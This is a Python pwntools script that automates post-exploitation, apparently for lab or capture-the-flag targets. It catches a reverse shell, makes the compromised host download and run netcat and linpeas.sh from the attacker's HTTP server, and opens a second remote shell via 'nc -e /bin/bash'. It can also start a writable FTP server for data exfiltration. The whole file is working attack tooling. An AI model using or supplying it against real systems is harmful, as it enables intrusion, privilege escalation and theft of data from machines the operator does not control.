#!/usr/bin/python3

from pwn import *
import argparse
import random
import threading
import socket
import fcntl
import struct


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", help="Listen port for the reverse shell", type=int, default=4444)
    parser.add_argument("-lp", "--lport", help="Local port for the file server", type=int, default=9001)
    parser.add_argument("-i", "--interface", help="The interface to use", type=str, default="tun0")
    parser.add_argument("-d", "--dport", help="The port to use for data exfiltration",
                        type=int, default=None)
    parser.add_argument("-o", "--os", help="Currently not used", type=str, default="Linux")
    args = parser.parse_args()
    return args


def get_file(tmp_dir, ip, lport, p, filename):
    p.sendline(f"wget http://{ip}:{lport}/www/{filename} -O {tmp_dir}/{filename}".encode())
    p.sendline(f"chmod +x {tmp_dir}/{filename}".encode())


def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
    p = process("/bin/bash")  # Spawns a process
    p.sendline(f"nc -lvnp {port}".encode())
    print(f"Reverse shell_recon listening on port {port}")
    needle = "connect to"
    # Wait for needle to appear in the output
    p.recvuntil(needle.encode())

    # Spawn the manual shell thread
    threading.Thread(target=manual_shell, args=(mport,)).start()

    p.sendline(f"mkdir {tmp_dir}".encode())
    get_file(tmp_dir, ip, lport, p, "nc")
    p.sendline(f"wget http://{ip}:{lport}/www/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
    p.sendline(f"chmod +x {tmp_dir}/linpeas.sh".encode())
    p.sendline(f"cd {tmp_dir}".encode())
    p.sendline(f"nohup ./linpeas.sh -w -q -s < /dev/null > linpeas.txt 2>&1 &".encode())
    # Linpeas will run in the background with the output redirected to a file and
    # input from /dev/null and errors redirected to stdout
    p.sendline(f"./nc {ip} {mport} -e /bin/bash".encode())
    exit()


def file_server(lport):
    p = process("/bin/bash")
    p.sendline(f"python3 -m http.server {lport}".encode())
    print(f"File server is listening on port {lport}")


def manual_shell(mport):
    p = process("/bin/bash")
    p.sendline(f"nc -lvnp {mport}".encode())
    print(f"Manual shell listening on port {mport}")
    needle = "connect to"
    # Wait for needle to appear in the output
    p.recvuntil(needle.encode())
    p.sendline("clear".encode())
    p.interactive()


# Function to get the IP address of the current machine
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])


def checks(args):
    # Sudo check if -d is used
    if args.dport is not None:
        if os.geteuid() != 0 and args.dport < 1024:
            print(f"You need to have root privileges to run pyftpdlib on port {args.dport}.")
            return False
        else:
            print(f"FTP Server will run on port {args.dport}")

    # Check if linpeas is present
    if os.path.exists("./www/linpeas.sh"):
        print("The file exists")

    else:
        print("The file doesn't exist on the local machine")
        # Prompt the user to download the file
        download = input("Do you want to download the file? "
                         "/!\\ Might be outdated /!\\ (y/n): ")
        if download == "y":
            # Download the file
            os.system("wget https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O ./www/linpeas.sh")

        else:
            # Prompt to continue without linpeas
            continue_without_linpeas = input("Do you want to continue without linpeas? (y/n): ")
            if continue_without_linpeas == "y":
                print("Continuing without linpeas")
            else:
                return False

    # Check if correct nc is present if not copy it and check if it is compatible
    if os.path.exists("./www/nc"):
        print("The nc is in the www folder")
        # Nc is present compatability is not checked!
        return True

    else:
        # Check if the nc version is compatible
        p = process("/bin/bash")
        p.sendline("nc -e".encode())
        needle = "invalid option"
        # read stdout if needle appears exit
        if p.recvuntil(needle.encode()):
            print("The current nc version is not compatible with the script")
            print("Are you using kali? "
                  "nc with the -e option is not present")
            # Kill the process
            p.kill()
            return False

        else:
            print("The nc version is compatible")
            # cppy the nc to the www folder
            os.system("cp /bin/nc ./www/nc")
            return True


# Function to start the ftp server if -d is used
def data_exfiltration(dport):
    p = process("/bin/bash")
    print("Starting the ftp server...")
    p.sendline("cd ./exfil".encode())
    p.sendline(f"python -m pyftpdlib -p {dport} --write".encode())


def main():
    # Parse the arguments
    args = parse_args()

    # Check if the arguments are correct
    if not checks(args):
        print("Exiting...")
        exit()

    # Create a temporary directory
    tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    print(tmp_dir)

    # Get the arguments
    lport = args.lport
    port = args.port
    mport = random.randint(1024, 65535)
    # Random port for the reverse shell that is not the same as the file server and burp
    while mport == port or mport == lport or mport == 8080:
        mport = random.randint(1024, 65535)
    current_os = args.os # Currently unused
    ip = get_ip_address("eth0")

    # 1. Spawn the reverse shell recon thread
    threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip, mport)).start()
    # 2. Spawn the file server thread
    threading.Thread(target=file_server, args=(lport,)).start()
    # 3. Spawn the data exfiltration thread if -d is used
    if args.dport:
        threading.Thread(target=data_exfiltration, args=(args.dport,)).start()


if __name__ == "__main__":
    main()
